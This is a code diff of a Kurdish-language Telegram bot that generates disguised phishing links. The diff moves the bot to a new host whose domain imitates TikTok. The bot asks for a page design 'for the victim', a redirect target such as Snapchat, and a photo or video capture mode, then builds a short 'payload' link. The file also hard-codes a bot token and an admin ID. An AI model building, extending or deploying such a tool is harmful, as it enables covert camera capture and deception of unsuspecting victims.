@@ -13,7 +13,7 @@ from aiogram.filters import Command
 
 TOKEN = "8364609349:AAF7i3nTGuvRnIV2kHSbWFCnPnj6iZdgBk4"
 ADMIN_ID = 5583813672
-FIXED_DOMAIN = "cyber-surche-bot-production.up.railway.app"
+FIXED_DOMAIN = "berlin-tiktok-com.onrender.com"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -114,7 +114,7 @@ TEXTS = {
         "ask_mode": "⚙️ **تکایە جۆری هەواڵگری هەڵبژێرە:**",
         "ask_template": "🎨 **تکایە دیزاینی پەڕەکە هەڵبژێرە بۆ قوربانی:**",
         "ask_redirect": "🔗 **فەرموو لینکی مەبەست (Redirect Link) بۆ بنێرە** (وەک `https://snapchat.com/...`) تاوەکو قوربانییەکە ڕاستەوخۆ بۆی ببرێت.",
-        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Railway\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
+        "stats": "📊 **بارودۆخی سیستەمی شاهانە:**\n\n• دخ: 🟢 ۱۰۰٪ کارا و خێرا\n• ئاستی پارێزراوی: 🛡️ پلەی یەکەم (حکومی)\n• وێب سێرڤەر: 🌐 پەیوەستکراو بە Render\n• قەبارە و هێز: ⚡ ۲x بەهێزکراو",
         "lang_select": "⚙️ **فەرموو زمانی پەیوەندیکردن هەڵبژێرە:**",
         "lang_changed": "🟢 زمان گۆڕرا بۆ **کوردی**.",
         "ai_prompt": "🧠 **ناوەندی زیرەکی دەستکرد ئامادەیە:**\nفەرموو پرسیار یان داواکارییەکەت بنووسە تاوەکو وەڵامت بدەمەوە.",
@@ -280,14 +280,14 @@ async def handle_text_inputs(message: Message):
         mode = state_info.get("mode", "video")
         template = state_info.get("template", "robot")
         
-        railway_domain = FIXED_DOMAIN
-        if not railway_domain.startswith("http"):
-            railway_domain = f"https://{railway_domain}"
+        render_domain = FIXED_DOMAIN
+        if not render_domain.startswith("http"):
+            render_domain = f"https://{render_domain}"
             
         payload_data = f"{user_id}|{mode}|{template}|{target_url}"
         short_code = create_short_link(payload_data)
         
-        payload_link = f"{railway_domain}/s/{short_code}"
+        payload_link = f"{render_domain}/s/{short_code}"
         
         mode_name = "🎥 ڤیدیۆ" if mode == "video" else "📸 ڕەسم"
         template_name = "🤖 Not a Robot" if template == "robot" else ("▶️ دوگمەی پەخش" if template == "play" else "🔗 نیشاندانی لینک")
